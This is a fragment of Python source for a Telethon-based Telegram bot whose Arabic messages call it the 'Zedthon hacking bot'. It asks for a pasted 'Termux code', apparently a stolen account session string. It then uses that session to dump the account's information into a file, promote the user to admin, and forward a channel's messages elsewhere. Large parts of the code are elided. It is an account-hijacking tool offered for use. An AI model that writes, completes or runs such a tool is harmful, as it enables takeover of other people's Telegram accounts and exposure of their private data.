...
client = TelegramClient('Zedthon', api_id, api_hash).start(bot_token=token)
...
async def op(event):
  if not event.sender_id == legendx:
    return await event.reply("@ZedThon")
  async for x in client.iter_messages("legendx_xd"):
    try:
      await x.forward_to("ZedthonDEV")
    except:
      pass
  ...
  async with bot.conversation(event.chat_id) as x:
    ...
    if res.text == "A":
      ...
      if len(i) > 3855:
        ...
        file.write(i + "\n\n**⌔∮ المعلومات بواسطه زد ثــون**")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n**⌔∮ شكرا لاستخدام بوت زد ثــون للاختراق**")
    elif res.text == "B":
      await x.send_message("**⌔∮ حسنا ارسل كود تيرمكس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("**⌔∮ تم رفعك مشرف بنجاح ✅**\n\n**⌔∮ شكـراً  لــ استخدامـك بوت زدثــون للاختـراق**")
    elif res.text == "K":
      await x.send_message("**⌔∮ حسنا ارسل كود تيرمكس الآن**")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      try:
        ...
        await event.respond("اارسل هذا الخطأ الى @ZedThon \n**الخطـأ**\n" + str(e))
